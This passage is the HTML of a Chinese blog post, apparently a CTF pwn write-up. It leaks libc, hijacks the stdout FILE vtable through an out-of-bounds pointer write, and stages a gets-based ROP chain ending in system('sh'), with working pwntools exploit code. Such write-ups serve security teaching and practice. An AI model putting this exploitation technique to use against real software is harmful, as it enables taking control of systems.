+<p>首先使用选项5的函数， <code>leak</code> 出 <code>libc</code> 的基地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 首先利用 gift 泄露 libc</div><div class="line">choice(5)</div><div class="line">p.recvuntil(&quot;your gift:\n&quot;)</div><div class="line">libc.address = int(p.recvline().strip()) - libc.symbols[&apos;read&apos;]</div><div class="line">stdout_vtable_addr = libc.symbols[&apos;_IO_2_1_stdout_&apos;] + 0xd8   #  IO_2_1_stdout-&gt;vtable 的地址</div></pre></td></tr></table></figure>
+<p>然后我们在 <code>name</code> 缓冲区内布置好内容，让 越界读 使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 在 name buf 布置数据</div><div class="line">choice(4)</div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p64(stdout_vtable_addr)  # 修改虚表指针</div><div class="line">payload += cyclic(0x28 - len(payload))</div><div class="line">p.sendafter(&quot;enter new name:&quot;, payload)</div></pre></td></tr></table></figure>
+<p>数据布置好了以后，利用 <code>edit</code> 里面的越界读漏洞，进行任意地址写， 修改 <code>IO_2_1_stdout-&gt;vtable</code> 为 <code>name</code> 缓冲区的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">bss_name = 0x6020A0  # bss name 缓冲区的地址</div><div class="line"></div><div class="line"># 利用 越界 获取指针的漏洞进行任意地址写</div><div class="line">choice(2)</div><div class="line">p.sendlineafter(&quot;2. insecure edit&quot;, &quot;2&quot;)</div><div class="line">sleep(0.1)</div><div class="line">p.sendlineafter(&quot;index: &quot;, &apos;12&apos;)   # index 12 ---&gt; 会从 name 缓冲区开始处取8字节作为指针</div><div class="line">sleep(0.1)</div><div class="line">payload = p64(bss_name) # 修改 vtable 的值， 把 vtable 改成 bss_name</div><div class="line">p.sendafter(&quot;new username: &quot;, payload[:6])   # 修改的数据， 把虚表改到 bss .</div></pre></td></tr></table></figure>
+<p>使用 <code>ida</code> 可以看到 <code>users</code> 数组的起始地址为 <code>0x0602040</code> , <code>name</code> 缓冲区的地址 为 <code>0x006020a0</code>。 所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(0x006020a0-0x00602040)/8 = 12</div></pre></td></tr></table></figure>
+<p>这样一来就会把 <code>name</code> 缓冲区开始 的 <code>8</code> 个字节作为 <code>user</code> 指针对其进行内容修改。而在之前我们已经布局好 <code>name</code> ，使得 <code>name</code> 缓冲区开始 的 <code>8</code> 个字节 为  <code>IO_2_1_stdout-&gt;vtable</code> 的地址，这样在后面设置 <code>new username</code> 时 就可以修改   <code>IO_2_1_stdout-&gt;vtable</code>  了。</p>
+<p>然后输入 <code>new username</code> 为 <code>p64(bss_name)</code> 前 <code>6</code> 字节 ， 就可以修改   <code>IO_2_1_stdout-&gt;vtable</code> 为 <code>name</code> 缓冲区的地址。</p>
+<blockquote>
+<p>只发送前 6 个字节的原因是 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; len = strlen(obj);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>长度是用 <code>strlen</code> 获取的， <code>IO_2_1_stdout-&gt;vtable</code>  原来的值是  <code>libc</code>  的地址开始的 <code>6</code> 个字节是非 <code>\x00</code>， 所以 <code>strlen</code> 会返回 <code>6</code>。</p>
+</blockquote>
+<p>接下来使用到 <code>stdout</code> 时，就会用到伪造的 虚表 （<code>name</code> 缓冲区）</p>
+<p>调试看看， 会发现 <code>crash</code> 了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135200-99ddb7f6-4c3a-1.png" alt="image.png"></p>
+<p>这里没有破坏栈的数据，所以栈回溯应该是正确的，所以看看栈回溯</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135208-9e8ee0cc-4c3a-1.png" alt="image.png"></p>
+<p>可以看到 <code>call [$rax + 0x38]</code> ， 然后 <code>$rax</code> 是 <code>name</code> 缓冲区的地址</p>
+<p>所以现在 $rax 的值我们可控， 只需要使得  rax + 0x38 也可控即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$rax  = bss_name - 0x18</div><div class="line">$rax + 0x38 ---&gt; bss_name + 0x20</div></pre></td></tr></table></figure>
+<p>这样一来就可以控制 <code>rip</code> 了。</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>可以控制 <code>rip</code> 后， 同时还有 <code>libc</code> 的地址 <code>one_gadget</code> 可以试一试，不过这东西看运气，在这个题就不能用。这里我们使用 <code>rop</code> 来搞。</p>
+<p>要进行 <code>rop</code>  首先得控制栈的数据，现在 <code>rax</code> 是我们可控的，一般的思路就是利用 <code>xchg rax,rsp</code> 之类的 <code>gadget</code> 来迁移栈到我们可控的地方，这里采取另外一种方式， <strong>利用 <code>libc</code> 的代码片段 ，直接往栈里面写数据, 布置  rop 链</strong>。</p>
+<p>首先来分析下要用到的 <code>gadget</code></p>
+<p>位于 <code>authnone_create-0x35</code> 处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">.text:000000000012B82B                 mov     rdi, rsp        ; gadget start</div><div class="line">.text:000000000012B82E                 call    qword ptr [rax+20h]</div><div class="line">.text:000000000012B831                 mov     cs:dword_3C8D9C, eax</div><div class="line">.text:000000000012B837                 mov     rax, [rsp+38h+var_30]</div><div class="line">.text:000000000012B83C                 mov     rax, [rax+38h]</div><div class="line">.text:000000000012B840                 test    rax, rax</div><div class="line">.text:000000000012B843                 jz      short loc_12B84A</div><div class="line">.text:000000000012B845                 mov     rdi, rsp</div><div class="line">.text:000000000012B848                 call    rax</div><div class="line">.text:000000000012B84A</div><div class="line">.text:000000000012B84A loc_12B84A:                             ; CODE XREF: sub_12B7A0+A3↑j</div><div class="line">.text:000000000012B84A                 add     rsp, 30h</div><div class="line">.text:000000000012B84E                 pop     rbx</div><div class="line">.text:000000000012B84F                 retn</div></pre></td></tr></table></figure>
+<p>可以看到 首先</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rdi = rsp</div><div class="line">call    qword ptr [rax+20h]</div></pre></td></tr></table></figure>
+<p>这样只要然后 <code>rax+0x20</code> 为 <code>gets</code> 函数的地址，就可以往 栈里面写数据了。</p>
+<blockquote>
+<p>开始以为 gets 函数会读到 \x00 终止，后来发现不是, 函数定义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; gets 函数从流中读取字符串，直到出现换行符或读到EOF为止，最后加上NULL作为字符串结束</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p><code>EOF</code> 貌似是 <code>-1</code> ，所以我们可以读入 <code>\x00</code> ，而且输入数据的长度还是我们可控的 （通过控制 <code>\n</code> ）</p>
+</blockquote>
+<p>此时已经可以覆盖返回地址了，下面就是让 上面的代码块 执行完 gets 后进入 loc_12B84A ， 分支。</p>
+<p>执行完  <code>call    qword ptr [rax+20h]</code>  后，会从   <code>esp+8</code>   处取出 <code>8</code> 字节放到 <code>rax</code> ，然后判断 <code>rax+0x38</code> 处存放的值是不是 <code>0</code> ， 如果为 <code>0</code>, 就可以进入 <code>loc_12B84A</code> 进行 <code>rop</code> 了 .</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.text:000000000012B831                 mov     cs:dword_3C8D9C, eax</div><div class="line">.text:000000000012B837                 mov     rax, [rsp+38h+var_30]</div><div class="line">.text:000000000012B83C                 mov     rax, [rax+38h]</div><div class="line">.text:000000000012B840                 test    rax, rax</div><div class="line">.text:000000000012B843                 jz      short loc_12B84A</div></pre></td></tr></table></figure>
+<h3 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h3><p>整理一下，分析分析最终的 <code>exp</code></p>
+<p>首先 <code>leak</code> 处 <code>libc</code> 的地址，获取到后面需要的一些 <code>gadget</code> 的地址</p>
+<p>然后往 <code>name</code> 缓冲区布置数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># 在 name buf 布置数据</div><div class="line">choice(4)</div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p64(stdout_vtable_addr)  # 修改虚表指针</div><div class="line">payload += p64(libc.symbols[&apos;gets&apos;]) # rip for call    qword ptr [rax+20h]</div><div class="line">payload += &quot;b&quot; *  0x10 # padding</div><div class="line">payload += p64(gadget)      # mov     rdi, rsp        ; gadget start 的地址</div><div class="line">payload += cyclic(0x28 - len(payload))</div><div class="line">p.sendafter(&quot;enter new name:&quot;, payload)</div></pre></td></tr></table></figure>
+<p>然后往触发漏洞，修改 <code>_IO_2_1_stdout_-&gt;vtable</code> 为 <code>bss_name - 0x18</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"># 利用 越界 获取指针的漏洞进行任意地址写</div><div class="line">choice(2)</div><div class="line">p.sendlineafter(&quot;2. insecure edit&quot;, &quot;2&quot;)</div><div class="line">sleep(0.1)</div><div class="line">p.sendlineafter(&quot;index: &quot;, &apos;12&apos;)   # index 12 ---&gt; 会从 name 开始处取8字节作为指针</div><div class="line">sleep(0.1)</div><div class="line">payload = p64(bss_name - 0x18) # padding for let </div><div class="line">p.sendafter(&quot;new username: &quot;, payload[:6])   # 修改的数据， 把虚表改到 bss .</div><div class="line">info(&quot;_IO_2_1_stdout_-&gt;vtable(&#123;&#125;)---&gt; bss_name&quot;.format(hex(stdout_vtable_addr)))</div><div class="line"># gdb.attach(p)</div><div class="line">pause()</div></pre></td></tr></table></figure>
+<p> 这就使得 接下来 <code>call [eax + 0x38]</code> 会变成  <code>call [name+0x20]</code> ， 也就是 进入 <code>gadget</code> 。</p>
+<p>会调用  <code>call    qword ptr [rax+20h]</code>  ，其实就是   <code>call [name+0x8]</code>   ， 之前已经设置为 <code>gets</code> 函数的地址，所以会调用 <code>gets</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">pop_rdi_ret = 0x0000000000400f13</div><div class="line"></div><div class="line"># zero addr</div><div class="line">zero_addr = 0x6020c8  #  该位置的值为 p64(0)</div><div class="line">info(&quot;zero_addr: &quot; + hex(zero_addr))</div><div class="line">payload = &apos;a&apos; * 8</div><div class="line">payload += p64(zero_addr - 0x38)</div><div class="line">payload += cyclic(40)</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(libc.symbols[&apos;system&apos;])</div><div class="line">p.sendline(payload)</div></pre></td></tr></table></figure>
+<p>然后通过 <code>gets</code> 往栈里面布置数据， 把 <code>rsp+8</code> 设置为 <code>zero_addr</code> （该位置的值为 <code>p64(0)</code>），然后 <code>rop</code> 调用 <code>system(&quot;sh&quot;)</code> 即可</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135304-bfa26a0e-4c3a-1.png" alt="image.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> <code>authnone_create-0x35</code> 处的这个 <code>gadget</code> 还是比较有趣的，以后能控制 rax 处的内容 时可以选择用这种方式, 比如可以修改 虚表指针时。</p>
+<p><strong>参考</strong></p>
+<p><a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/babyheap-200" target="_blank" rel="external">https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/babyheap-200</a></p>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html">http://blog.hac425.top/2018/04/30/pwn_with_file_rop_by_vtable.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2018/05/01/ciscn2018-pwn-wp.html" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/04/29/linux_kernel_pwn_notes.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/girl.png" alt="hac425's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        hac425xxx@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">14</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">13</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">1</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/Vulnerability-analysis/">Vulnerability analysis<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/chrome/">chrome<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/ctf/">ctf<span class="sidebar_archives-count">20</span></a></li><li><a class="sidebar_archives-link" href="/categories/java应用破解思路/">java应用破解思路<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/jeb破解/">jeb破解<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/kernel/">kernel<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/pwn-router-os/">pwn_router_os<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/reverse/">reverse<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/代码审计/">代码审计<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/安卓安全/">安卓安全<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/categories/文件patch/">文件patch<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透测试/">渗透测试<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/破解/">破解<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/路由器安全/">路由器安全<span class="sidebar_archives-count">10</span></a>
+            </ul>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/about" title="关于我">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于我
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/timeline" title="时间轴">
+                
+                    <i class="material-icons sidebar-material-icons">timeline</i>
+                
+                时间轴
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/links" title="友情链接">
+                
+                    <i class="material-icons sidebar-material-icons">people</i>
+                
+                友情链接
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/tags" title="标签云">
+                
+                    <i class="material-icons sidebar-material-icons">invert_colors</i>
+                
+                标签云
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">63</span>
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+<!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/hac425" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+        <a href="http://weibo.com/u/5691483590" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
+                <span class="visuallyhidden">Weibo</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://gitee.com/hac425/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>穷则变，变则通，通则久
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?wgjW/HuQG9JDgvPDPoRAng==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+   
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+    
+        <script>lsloader.load("hanabi","/js/hanabi-browser-bundle.js?5+2z7ZZmFuZK5IcimlZbxw==", true)</script>
+    
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+        
+        
+        HanabiBrowser.start('pre code',true);
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
